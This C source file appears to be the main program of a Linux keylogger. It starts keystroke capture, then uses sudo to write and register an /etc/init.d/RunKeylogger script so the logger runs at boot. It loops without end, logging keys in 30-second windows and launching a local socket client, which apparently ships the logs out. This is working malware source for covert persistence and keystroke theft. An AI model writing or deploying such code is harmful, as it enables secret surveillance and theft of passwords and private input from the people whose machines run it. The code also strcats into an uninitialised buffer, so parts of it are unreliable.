#include "Keylogger/keylogger.c"
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <string.h>

int trigger = 30000;
void time_30s(int trigger);

int main (){
        keylogger_init();
        char cwd[1024];
        char dir_cli[1024];
        char dir_main[1024];
        if (getcwd(cwd, sizeof(cwd)) != NULL) {
                strcpy(dir_main, cwd);
                strcat(dir_main,"/main &");
                char comm[1024];
                strcpy(comm,"sudo sh -c \"echo \'#!/bin/bash\n");
                strcat(comm, dir_main);
                strcat(comm, "\' >> /etc/init.d/RunKeylogger\"");
                printf("%s\n",comm);
                system(comm);
                system("sudo chmod +x /etc/init.d/RunKeylogger");
                system("sudo update-rc.d RunKeylogger defaults");

                strcat(dir_cli,cwd);
                strcat(dir_cli, "/socket/client");
                while (1) {
                        keylogger_start();
                        time_30s(trigger);
                        keylogger_end();
                        system(dir_cli);
                }
        }
}

void time_30s(int trigger){
        int msec = 0;
        clock_t before = clock();
        do {
                clock_t difference = clock() - before;
                msec = difference * 1000 / CLOCKS_PER_SEC;
        } while ( msec < trigger );
}
